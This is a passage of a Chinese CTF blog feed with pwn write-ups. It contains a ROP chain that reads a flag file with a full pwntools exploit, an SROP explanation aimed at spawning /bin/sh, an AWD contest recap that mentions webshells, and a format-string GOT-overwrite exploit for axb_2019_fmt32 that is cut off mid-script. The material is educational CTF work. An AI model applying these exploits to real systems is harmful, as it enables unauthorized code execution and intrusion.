class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span></span><br></pre></td></tr></table></figure><p>这一部分输入之后<code>gdb</code>调试看看能不能成功打开<code>flag</code>文件。</p><p><img src="https://i.loli.net/2021/07/16/3cn94oHrGYumJR5.png" alt="zjctf pwn1_5.png"></p><p>可以看到已经成功把<code>rdi</code>的值变成了<code>flag</code>字符串了，后面一步也是直接执行了<code>open</code>函数。接着调试发现<code>open</code>返回值为3，说明该文件描述符为3，等一下<code>read</code>里面的<code>fd</code>参数就应该给3了。因为这里有三个参数，前两个寄存器的gadget很容易找得到，第三个rdx相关的gadget是死活找不到。这样的话有三种应对措施</p><p>①ret2csu，这个方法套一下模板和容易就可以执行了这个read。</p><p>②去libc中找到rdx相关的gadget，这是官方放出的wp的思路。</p><p>③我另辟蹊径，开辟出第三种方法，这个是一个小技巧，可以记一下：在调用<code>strcmp</code>函数的时候，rdx的值会变成两个字符串中第一个不同字符的第二个字符串对应位置的<code>ascii</code>值。举个栗子，如果我调用strcmp(“aaa”,”abc”)的话，结束的时候rdx的值为’b’。</p><p>这里我用了第三种方法。那么接下来的payload就是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/16/IvO5gMmzlTKrU6Z.png" alt="zjctf pwn1_6.png"></p><p>继续运行下去可以发现read成功地把我本地的flag文件读到了栈上面</p><p><img src="https://i.loli.net/2021/07/16/1zQqSBaEGswuAgp.png" alt="zjctf pwn1_7.png"></p><p>最后一步应该很简单，就是把那个地方的字符串puts出来，因为在调试器里面我们能看到这个flag，但是打远程的时候我们肯定要输出出来才能看到这串flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">、payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    +p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(puts_addr)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br></pre></td></tr></table></figure><p>怎么说呢？难是很难，但是确实收获很多，如果想试试这题的师傅们可以直接联系我qq找我要。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400943</span></span><br><span class="line">welcome=<span class="number">0x400726</span></span><br><span class="line">pop_rsi_pop=<span class="number">0x400941</span></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%27$p\n%31$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(welcome)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;you?&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=(u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">op=puts_addr+<span class="number">0x898b0</span></span><br><span class="line">strcmp=puts_addr+<span class="number">0xff5c0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    +p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(puts_addr)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>今天开始以学习了花式的栈溢出ROP攻击，BROP这个东西朴实无华且用处不大，思想能了解，但是现在谁打个pwn还不给elf呢，不给libc文件都会被喷死，还敢不给elf？因此跳过这个学习一下SROP。</p><span id="more"></span><p>SROP主要攻击方式就是针对linux系统调用的一个弱点进行攻击的，在进行系统调用的时候，内核会发出signal挂起我们正在运行的程序，并且保存上下文（上下文即所有寄存器的值），然后这个上下文还是以一个结构体的形式存在于栈里面的。此时从用户态切换到内核态，说明现在在执行系统调用，执行完成系统调用的时候会进行系统调用的返回，这个返回又要调用15号的系统调用，恢复上下文并且切换到用户态。这样子系统调用的方法有一个弱点就是，如果我控制了栈，在它挂起的时候我偷偷修改rip=syscall,rax=59(execeve的系统调用号),rdi=”/bin/sh”,rsi=0,rdx=0。那么在结束系统调用的时候就会执行execeve(“/bin/sh”)打开一个shell。</p><p>在就是说在结束系统调用的时候会进行这么一个系统调用，那么如果我本身没有系统调用而调用了这个系统调用会怎么样呢？答案是还会把栈顶的上下文给返回，当然没有精心构造过栈而直接调用肯定是会出错的。攻击的时候我就让它准备好dl_sigreturn的系统调用，然后在预期的栈顶构造一个只执行execeve(“/bin/sh”)的上下文，那么就可以直接完成打开shell的攻击。</p><p>以上都是我根据srop以及一些师傅的资料自己理解的，如有错误那挺正常的，也请师傅们能指出我的错误，感激不尽。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021华东南赛区国赛线下赛</title>
      <link href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
      <url>/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>这两天来到了福州打awd的线下赛，这是我第一次打awd，收获很多。</p><span id="more"></span><p>先说一下大体的感想，awd真的比ctf好玩太多了，awd能真正体会到那么多网络安全爱好者相互网络攻击的那种乐趣。</p><p>首先入场开始比赛的时候真的是啥也不知道，不过好在有学长带队，啥也不会的我终于在第三轮的时候连上了自己的靶机hhh。学长是打web的，但是在场的web师傅都太厉害了，上的不死马不仅让我们队的靶机down机还不停地拿flag，甚至最后删库都阻止不了他们拿flag。</p><p>咱们第一天的web三题有一题不停地down机又被打，在下午，也是第24，25轮的时候有人ddos题目让所有人都down机了，主办方重启环境还恢复了配置，这可以说是让我们捡了一个漏，因为相当于是帮我们修好了环境，题目上线的时候果断删库，及时保住了一些分，与此同时通过查流量以及不停地测试也是把pwn题的payload给拿到了，因为整个pwn题的输入就是一个0x2000字节的read，查流量也不是很难。但是由于师傅们上午就pwn出了第一道，我也是在不停地堵pwn的漏洞，到最后给自己弄down机了，删库还是没用，依然被打，所以下午我打算不补pwn题让他们随便打了，这波至少赚了几千分。</p><p>第二天的pwn两题都很简单，依然查流量包抄的payload拿下了大部分队伍的pwn分数，修洞的时候又不小心down了，还被打，我就又删库，可是还是有人打，结果最后就是环境恢复不了，全场就咱们队oop那道pwn题down了。最关键是down就down了，还有人打就无语了。。唯一的一道web题依然中了不死马导致又down又被打，每轮稳定扣500分(web 又down又被打，pwn1又down又被打，pwn2一直被打)，还好pwn 多数队伍没有补，最基本的几百分还是能填上坑的。上午从rk40冲进了rk33，rk33是稳稳地三等奖，但是自从少数师傅修好了pwn题局势就开始不妙了，本来我打死不想修的，但是看到有些队伍修成功了我不禁又被诱惑了，但是结果还是不随人愿。所以pwn2我就没有去修了。最终榜上rk36，那都是非常卡奖项的一个位置。因为三等奖是40%-60%。首先得刚好60%*60队=36队。但是有队伍没去比赛要扣名额就比较危险了。最终不知是主办方还是按照60队60%比例算了还是前面队伍有人ddos或者上通防被查了我们还是很幸运地挤进了三等奖的最后一个名额，这是最最最开心的。</p><p>当然本次线下awd收获的经验也是非常多的，比如前面复盘介绍的pwn题被check down 的原因是:未给权限，也是linux基础不牢吧。前几次patch的elf文件守住了两轮，之后还是被打。昨晚我苦思冥想想了很久，问了很多师傅，最终N0vice师傅一语点通了发生的一切自己解释不了的事。第一次patch的elf文件是直接覆盖的，因此权限维持相同，并且很多师傅拿通用脚本打不通我的靶机，机子也没有check down。后来被打是因为真的有人无聊开始拿payload直接nc 去连接维持一个shell权限，我以为是被打通了接着换方式patch，殊不知靶机上面又几页的shell进程留在那边，这是我真没想到的。我还以为是我patch的有问题，就删文件上传，结果权限不够导致无法通过check down，与此同时还有队伍留了shell进程一直被打。</p><p>awd比赛真的太好玩了，期待下次的awd比赛。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>axb_2019_fmt32 wp</title>
      <link href="/2021/06/08/axb_2019_fmt32%20wp/"/>
      <url>/2021/06/08/axb_2019_fmt32%20wp/</url>
      
        <content type="html"><![CDATA[<p>临近期末考试了，终于可以光明正大地水博客了。</p><span id="more"></span><p>最近刚写上格式化字符串的漏洞，这不，他来了。这个题目我做过之后感觉难度还是有的，做出这一题至少对格式化字符串漏洞的利用是有一个较深的理解了的。它综合考察了<code>ret2libc</code>和格式化字符串的任意写，以及对got表的理解。</p><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><a href="https://buuoj.cn/challenges#axb_2019_fmt32">axb_2019_fmt32</a></h2><p>下载文件，反汇编打开，再反编译<code>main()</code>函数得到如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">257</span>]; <span class="comment">// [esp+Fh] [ebp-239h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+110h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寻找字符串并没有发现<code>flag</code>,<code>/bin/sh</code>等字眼，plt表也没有装载<code>system</code>函数，那就分析main函数，一个很明显的格式化字符串漏洞<code>printf(format);</code> <code>format</code>是由我们控制的，首先清楚一点，程序采取read函数读取我们的输入，大小卡的也很死，无法溢出。</p><h3 id="泄露libc地址的准备"><a href="#泄露libc地址的准备" class="headerlink" title="泄露libc地址的准备"></a>泄露libc地址的准备</h3><p>那么我们第一步肯定也是泄露libc的地址，不能溢出那就不能构造rop链去输出，只能用程序本身的printf去输出。我们目前能确定的只有libc函数got表地址，而got表地址的值装的才是libc函数的地址。通俗点讲我现在知道一个地址，但是我要的是这个地址的值。<code>%d %x %f</code>那些都是你传什么就输出什么。举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">0xdeadbeef</span>;</span><br><span class="line"><span class="comment">//假设&amp;a=0x61616161</span></span><br><span class="line"><span class="keyword">int</span> b=&amp;a;</span><br></pre></td></tr></table></figure><p>当热这种写法是错的，但是逻辑应该都能理解的。如果我知道b的值了，那么我如何知道b的值所代表的地址的值呢，如果<code>printf(&quot;%d&quot;,b);</code>的话，那么你只能得到<code>0x61616161</code>而得不到你想要的<code>0xdeadbeef</code>，这个时候就要提到一个知识点了:字符串传参，我在之前的博客应该也有所讲过，字符串传参是用指针传的。因为字符串是大端序，所以一个指针的字符串判定是从这个指针开始一直到下一个<code>&#39;\0&#39;</code>字节(向高地址)为这个指针代表的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value:  00 41 42 43 44 45 43 41 00</span><br><span class="line">address:00 01 02 03 04 05 06 07 08</span><br></pre></td></tr></table></figure><p>那么04字符串就是<code>deca</code></p><p>03字符串就是<code>cdeca</code></p><p>以此类推。。。</p><p>那么字符串就成了泄露libc地址的有利工具，<code>printf(&quot;%s&quot;,b);</code>就可以泄露libc函数的地址了。</p><h3 id="确定偏移泄露libc寻找system函数地址"><a href="#确定偏移泄露libc寻找system函数地址" class="headerlink" title="确定偏移泄露libc寻找system函数地址"></a>确定偏移泄露libc寻找system函数地址</h3><p>确定偏移从来是看不出来的，要自己动调去确定偏移，直接运行会发现有时钟控制，那么我们gdb调试，在read和printf函数都下断点，输入<code>aaaa%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x</code></p><p>得到结果：</p><p><img src="https://i.loli.net/2021/06/08/LxJ63SAr1KdH9qb.png" alt="buuoj axb_2019_fmt32_1.png"></p><p>可以看到我们输入的4个a在printf里面被分割了，第8个参数有3个a(0x61)，第7个参数有1个，那么我们把第七个参数填充完整之后再在第八个参数的位置放上libc函数的got表地址，然后在最后加上<code>%8$s</code>就可以泄露libc地址了。</p><p>这里我选择泄露<code>puts</code>函数的地址</p><p>第一次payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;%8$s\0s&#x27;</span></span><br></pre></td></tr></table></figure><p>因为输出不单单只是输出payload，还加了很多junk数据，因此我们可以考虑在输出之前加一个特殊字符<code>&#39;\n&#39;</code>那么 我们在<code>p.recvuntil(b&#39;\n&#39;)</code>之后接收的四个字节一定就是puts的真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;\n%8$s\0s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]puts_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys)))</span><br></pre></td></tr></table></figure><p>这样我们就很轻松地得到了<code>system()</code>函数的地址</p><h3 id="确定攻击思路"><a href="#确定攻击思路" class="headerlink" title="确定攻击思路"></a>确定攻击思路</h3><p>我们不需要泄露<code>/bin/sh</code>字符串，因为之前就说了，我们并不能栈溢出劫持程序控制流，因此要考虑其它方法，printf可以任意写，那么我们就修改got表的内容，如果把strlen函数的got表改成system的地址，那么在调用strlen的时候就会执行system函数了。用printf函数应该也可以，但是人家改的时候就是在执行printf，所以给了你strlen就开开心心用嘛对吧。</p><p>由于一个地址的值比较大，一次覆盖要输出最多可能输出<code>0xffffffff</code>四十多亿个字符，最少也是<code>0xf7000000</code>个字符。所以我们采取分次赋值，把这个地址分成高字和低字，这样一次最多输出<code>0xffff</code>六万多个字符，在可接受的范围内，我们必须要一次赋值赋完，否则只赋一半就停，下面执行strlen函数就不在预期之内，会引发诸多错误，所以要改got表得一次改完。因为libc的基址一般都是0xf7开头的，所以这个函数高字肯定比较大，那么我们就先赋低字，在赋高字，缺的字符中间算算差值补足就好了。</p><p>这里又要介绍一个格式化字符串标识符了</p><p><code>%n$hn</code>给第n个参数地址赋值当前已打印字符的个数(大小为一个字(word))。那么我们就需要精心构造payload了，注意输出不止一个payload，还要注意前面的一些junk，经过计算，payload如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_low-<span class="number">18</span>).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_high-sys_low).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br></pre></td></tr></table></figure><p>最后一步就是给<code>/bin/sh</code>字符串了，第三次输入很简单，直接给<code>;/bin/sh;</code>即可，分号用于过滤前面的junk数据。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">proc=<span class="string">&#x27;./axb_2019_fmt32&#x27;</span></span><br><span class="line"><span class="comment">#p=process(proc)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25544</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(proc)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;\n%8$s\0s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]puts_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys)))</span><br><span class="line">sys_high=(sys&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">sys_low=sys&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_low:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_low)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_high:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_high)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_low-<span class="number">18</span>).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_high-sys_low).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span 